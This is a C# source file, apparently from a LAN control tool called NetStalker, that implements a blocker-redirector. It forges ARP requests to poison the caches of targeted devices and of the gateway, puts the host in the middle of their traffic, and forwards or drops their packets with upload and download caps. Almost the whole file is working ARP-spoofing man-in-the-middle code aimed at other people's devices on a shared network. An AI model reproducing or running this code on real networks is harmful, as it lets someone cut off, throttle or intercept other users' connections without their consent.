﻿using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace NetStalker.MainLogic
{
    public class Blocker_Redirector
    {
        /// <summary>
        /// Main capture device.
        /// </summary>
        public static LibPcapLiveDevice BRDevice;

        /// <summary>
        /// Blocker-Redirector task.
        /// </summary>
        public static Task BRTask;

        /// <summary>
        /// Main activation switch.
        /// </summary>
        public static bool BRMainSwitch = false;

        /// <summary>
        /// This is the main method for blocking and redirection of targeted devices.
        /// </summary>
        public static void BlockAndRedirect()
        {
            if (!BRMainSwitch)
                throw new InvalidOperationException("\"BRMainSwitch\" must be set to \"True\" in order to activate the BR");

            if (string.IsNullOrEmpty(Properties.Settings.Default.GatewayMac))
            {
                Properties.Settings.Default.GatewayMac = Main.Devices.Where(d => d.Key.Equals(AppConfiguration.GatewayIp)).Select(d => d.Value.MAC).FirstOrDefault().ToString();
                Properties.Settings.Default.Save();
            }

            if (BRDevice == null)
                BRDevice = (LibPcapLiveDevice)CaptureDeviceList.New()[AppConfiguration.AdapterName];

            BRDevice.Open(DeviceModes.Promiscuous, 1000);
            BRDevice.Filter = "ip";

            BRTask = Task.Run(() =>
            {
                RawCapture rawCapture;
                EthernetPacket packet;

                while (BRMainSwitch)
                {
                    if (BRDevice.GetNextPacket(out PacketCapture packetCapture) == GetPacketStatus.PacketRead)
                    {
                        rawCapture = packetCapture.GetPacket();
                        packet = Packet.ParsePacket(rawCapture.LinkLayerType, rawCapture.Data) as EthernetPacket;

                        if (packet == null)
                            continue;

                        Device device;

                        if ((device = Main.Devices.FirstOrDefault(D => D.Value.MAC.Equals(packet.SourceHardwareAddress)).Value) != null && device.Redirected && !device.IsLocalDevice && !device.IsGateway)
                        {
                            if (device.UploadCap == 0 || device.UploadCap > device.PacketsSentSinceLastReset)
                            {
                                packet.SourceHardwareAddress = BRDevice.MacAddress;
                                packet.DestinationHardwareAddress = AppConfiguration.GatewayMac;
                                BRDevice.SendPacket(packet);
                                device.PacketsSentSinceLastReset += packet.Bytes.Length;
                            }
                        }
                        else if (packet.SourceHardwareAddress.Equals(AppConfiguration.GatewayMac))
                        {
                            IPv4Packet IPV4 = packet.Extract<IPv4Packet>();

                            if (Main.Devices.TryGetValue(IPV4.DestinationAddress, out device) && device.Redirected && !device.IsLocalDevice && !device.IsGateway)
                            {
                                if (device.DownloadCap == 0 || device.DownloadCap > device.PacketsReceivedSinceLastReset)
                                {
                                    packet.SourceHardwareAddress = BRDevice.MacAddress;
                                    packet.DestinationHardwareAddress = device.MAC;
                                    BRDevice.SendPacket(packet);
                                    device.PacketsReceivedSinceLastReset += packet.Bytes.Length;
                                }
                            }
                        }
                    }

                    SpoofClients();
                }
            });
        }

        /// <summary>
        /// Loop around the list of targeted devices and spoof them.
        /// </summary>
        public static void SpoofClients()
        {
            foreach (var item in Main.Devices)
            {
                if (item.Value.Blocked && !item.Value.IsLocalDevice && !item.Value.IsGateway)
                {
                    ConstructAndSendArp(item.Value, BROperation.Spoof);
                    if (AppConfiguration.SpoofProtection)
                        ConstructAndSendArp(item.Value, BROperation.Protection);
                }
            }
        }

        /// <summary>
        /// Build an Arp packet for the selected device based on the operation type and send it.
        /// </summary>
        /// <param name="device">The targeted device</param>
        /// <param name="Operation">Operation type</param>
        public static void ConstructAndSendArp(Device device, BROperation Operation)
        {
            if (Operation == BROperation.Spoof)
            {
                ArpPacket ArpPacketForVicSpoof = new ArpPacket(ArpOperation.Request,
                    targetHardwareAddress: device.MAC,
                    targetProtocolAddress: device.IP,
                    senderHardwareAddress: BRDevice.MacAddress,
                    senderProtocolAddress: AppConfiguration.GatewayIp);

                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(
                    sourceHardwareAddress: BRDevice.MacAddress,
                    destinationHardwareAddress: device.MAC,
                    EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForVicSpoof
                };

                ArpPacket ArpPacketForGatewaySpoof = new ArpPacket(ArpOperation.Request,
                    targetHardwareAddress: AppConfiguration.GatewayMac,
                    targetProtocolAddress: AppConfiguration.GatewayIp,
                    senderHardwareAddress: BRDevice.MacAddress,
                    senderProtocolAddress: device.IP);

                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(
                     sourceHardwareAddress: BRDevice.MacAddress,
                     destinationHardwareAddress: AppConfiguration.GatewayMac,
                     EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewaySpoof
                };

                BRDevice.SendPacket(EtherPacketForVicSpoof);
                if (device.Redirected)
                    BRDevice.SendPacket(EtherPacketForGatewaySpoof);
            }
            else
            {
                ArpPacket ArpPacketForVicProtection = new ArpPacket(ArpOperation.Response,
                    targetHardwareAddress: BRDevice.MacAddress,
                    targetProtocolAddress: AppConfiguration.LocalIp,
                    senderHardwareAddress: device.MAC,
                    senderProtocolAddress: device.IP);

                EthernetPacket EtherPacketForVicProtection = new EthernetPacket(
                   sourceHardwareAddress: device.MAC,
                   destinationHardwareAddress: BRDevice.MacAddress,
                   EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForVicProtection
                };

                ArpPacket ArpPacketForGatewayProtection = new ArpPacket(ArpOperation.Response,
                   targetHardwareAddress: BRDevice.MacAddress,
                   targetProtocolAddress: AppConfiguration.LocalIp,
                   senderHardwareAddress: AppConfiguration.GatewayMac,
                   senderProtocolAddress: AppConfiguration.GatewayIp);

                EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(
                   sourceHardwareAddress: AppConfiguration.GatewayMac,
                   destinationHardwareAddress: BRDevice.MacAddress,
                    EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewayProtection
                };

                BRDevice.SendPacket(EtherPacketForGatewayProtection);
                BRDevice.SendPacket(EtherPacketForVicProtection);
            }
        }

        /// <summary>
        /// Close the Blocker/Redirector and release all its resources.
        /// </summary>
        public static void CLoseBR()
        {
            //Turn off the BR
            BRMainSwitch = false;

            if (Main.Devices != null)
            {
                foreach (var device in Main.Devices)
                {
                    device.Value.Redirected = false;
                    device.Value.Blocked = false;
                    device.Value.Limited = false;
                }
            }

            if (BRTask != null)
            {
                if (BRTask.Status == TaskStatus.Running)
                {
                    //Wait for the BR task to finish
                    BRTask.Wait();
                }

                //Dispose of the BR task
                BRTask.Dispose();

                BRDevice.Close();
                BRDevice.Dispose();
            }
        }
    }
}
